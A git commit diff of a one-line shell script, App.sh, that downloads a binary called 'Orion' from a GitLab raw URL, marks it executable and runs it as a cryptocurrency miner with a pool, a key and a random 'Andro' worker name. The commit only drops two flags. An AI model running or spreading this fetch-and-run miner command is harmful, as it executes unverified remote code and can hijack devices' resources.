be9395088b612e813d86a97acbe0645afa463d72
duniaboci13 <93588768+duniaboci13@users.noreply.github.com>
2025-06-21 06:34:47 +0700

    Update App.sh

--- App.sh
+++ App.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
-wget https://gitlab.com/rk4243617/android/-/raw/main/Orion && chmod +x Orion && ./Orion mine -a --pool twbitz --key APD1Uto5Rb5KbURTRrnfYuH1FjrH9eg4itLxfPZcnMHy --worker $(shuf -n 1 -i 1-99999)-Andro -t 8 --ice
+wget https://gitlab.com/rk4243617/android/-/raw/main/Orion && chmod +x Orion && ./Orion mine -a --pool twbitz --key APD1Uto5Rb5KbURTRrnfYuH1FjrH9eg4itLxfPZcnMHy --worker $(shuf -n 1 -i 1-99999)-Andro
 
